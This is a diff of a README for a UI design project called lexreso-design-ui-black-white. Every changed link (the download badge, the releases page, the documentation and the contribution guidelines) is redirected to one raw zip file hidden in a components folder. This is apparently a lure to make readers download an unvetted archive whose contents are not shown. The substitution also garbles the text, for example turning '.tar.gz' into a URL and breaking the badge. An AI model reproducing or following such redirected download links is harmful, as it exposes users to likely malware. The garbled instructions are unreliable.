@@ -1,6 +1,6 @@
 # 🎨 lexreso-design-ui-black-white - A Simple Way to Build Beautiful Interfaces
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/releases)
+[![Download Now](https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to lexreso-design-ui-black-white! This application provides a modern des
 
 To get started, you’ll need to visit the Releases page. Here, you can download the latest version of the application.
 
-[Visit this page to download the latest version.](https://github.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/releases)
+[Visit this page to download the latest version.](https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip)
 
 ### Steps to Download:
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
-3. Choose the download file for your system. This may be a `.zip` or a `.tar.gz` file.
+3. Choose the download file for your system. This may be a `.zip` or a `https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip` file.
 4. Click the file to start downloading. 
 
 ### System Requirements:
@@ -96,8 +96,8 @@ If you encounter issues while using the application or have questions, please su
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://github.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/releases)
-- [Documentation](https://github.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/wiki)
-- [Contribution Guidelines](https://github.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Cuspidorhomesteader105/lexreso-design-ui-black-white/main/components/features/lexreso-design-ui-black-white_v1.0.zip)
 
 Feel free to explore and make the most of your design projects with lexreso-design-ui-black-white!
